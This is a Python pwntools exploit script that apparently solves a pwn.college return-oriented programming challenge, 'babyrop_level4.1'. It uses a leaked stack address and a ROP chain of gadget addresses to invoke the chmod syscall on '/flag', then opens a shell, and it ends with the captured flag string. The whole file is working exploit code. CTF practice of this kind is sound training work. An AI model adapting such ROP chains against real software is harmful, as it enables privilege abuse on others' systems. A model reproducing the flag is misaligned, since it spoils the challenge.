from pwn import *

elf = ELF("./babyrop_level4.1")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
pop_rax = 0x0000000000401d56
pop_rdi = 0x0000000000401d4e
pop_rsi = 0x0000000000401d46
syscall = 0x0000000000401d76

io = s.process("/challenge/babyrop_level4.1")
io.recvuntil(b'[LEAK] Your input buffer is located at: ')
stack = int(io.recvline()[:-2], 16)
info("Leak stack: " + hex(stack))

chain = b'/flag\x00'    
chain += b'a' * (0x38 - len(chain))
chain += p64(pop_rax) + p64(0x5a) + p64(pop_rdi) + p64(stack) + p64(pop_rsi) + p64(7) + p64(syscall)
io.send(chain)
io.close()

sh = s.shell(b'/bin/sh')
sh.interactive()
# Flag: pwn.college{QbriMVuvuHP1N7JxiCVplX8RXgB.0FO0MDLxIjNyEzW}